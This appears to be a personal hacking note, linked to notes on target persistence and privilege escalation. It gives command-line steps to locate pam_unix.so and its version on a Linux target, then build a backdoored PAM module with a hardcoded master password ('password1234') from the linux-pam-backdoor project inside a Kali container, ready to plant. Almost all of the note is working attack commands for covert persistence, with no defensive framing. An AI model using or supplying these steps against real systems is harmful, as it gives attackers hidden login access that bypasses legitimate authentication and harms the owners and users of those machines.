# linux PAM module backdoor password build script
https://github.com/zephrax/linux-pam-backdoor
```bash
## find path
find /usr/lib -name pam_unix.so 2>/dev/null

## determine pam version on target
### debian
dpkg -l | grep pam
### centos / redhat / RHEL
rpm -qa | grep pam
```
run on host
```bash
docker run --rm -v "$(pwd):/host" -it kalilinux/kali-rolling

apt update
apt install -y git wget autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc

git clone https://github.com/zephrax/linux-pam-backdoor
cd linux-pam-backdoor
./backdoor.sh -v 1.5.2 -p password1234
cp pam_unix.so /host
exit
```

` zet/20221003150353/README.md `

# Related

- [20221013174958](/zet/20221013174958/README.md) concept of persistence on a target
- [20221008215325](/zet/20221008215325/README.md) password
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub
- [20221006025356](/zet/20221006025356/README.md) linux
- [20221003151210](/zet/20221003151210/README.md) linux privilege escalation

Tags:

    
